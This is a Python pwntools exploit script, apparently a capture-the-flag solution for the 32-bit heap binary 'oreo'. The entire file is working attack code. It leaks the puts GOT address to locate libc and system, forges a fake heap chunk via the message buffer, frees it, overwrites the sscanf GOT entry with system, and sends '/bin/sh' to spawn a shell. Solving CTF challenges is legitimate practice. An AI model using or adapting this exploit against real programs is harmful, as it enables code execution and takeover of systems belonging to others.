#!/usr/bin/python
from pwn import *
context(log_level='debug')

p=process('./oreo')
elf=ELF('./oreo')
#struct 
#description 25
#name 27
#pre 4

def add(description,name):
    p.sendline('1')
    p.sendline(name)
    p.sendline(description)

def show():
    p.sendline('2')
    p.recvuntil('Description: AAAA')
    p.recvuntil('Description: ')
    data=p.recvuntil('===================================\n')
    return data[:4]

def order():
    p.sendline('3')

def message(content):
    p.sendline('4')
    p.sendline(content)

#leak
puts_got=elf.got['puts']
name='A'*27+p32(puts_got)
description='A'*25
add(description,name)
leak=show()
puts_addr=u32(leak)
system_offset=0x0003ada0
puts_offset=0x0005fca0
log.info("puts:"+hex(puts_addr))
libc_base=puts_addr-puts_offset
system_addr=libc_base+system_offset
log.info("libc:"+hex(libc_base))
log.info("system:"+hex(system_addr))

add_time=1

#fake
add_time_addr=0x0804A2A4
message_addr=0x0804A2A8
message_buf=0x0804A2C0
while add_time<0x3f:
    add('A'*25,'A'*27)
    add_time+=1

#add_time=0x3f

payload='A'*27+p64(message_addr)
add('A'*25,payload)
#fake chunk start from 0x804A2A0
#fake chunk content start from 0x804A288=>message
#A0+0x40=E0=C0+0X20
#payload start from 0x8004A2C0
payload='\x00'*0x20+p32(0x40)+p32(0x50)
message(payload)


#free
order()
#change thing
payload=p64(elf.got['__isoc99_sscanf'])
add(payload,'A'*27)
payload=p64(system_addr)
message(payload)
p.sendline('/bin/sh')



p.interactive()
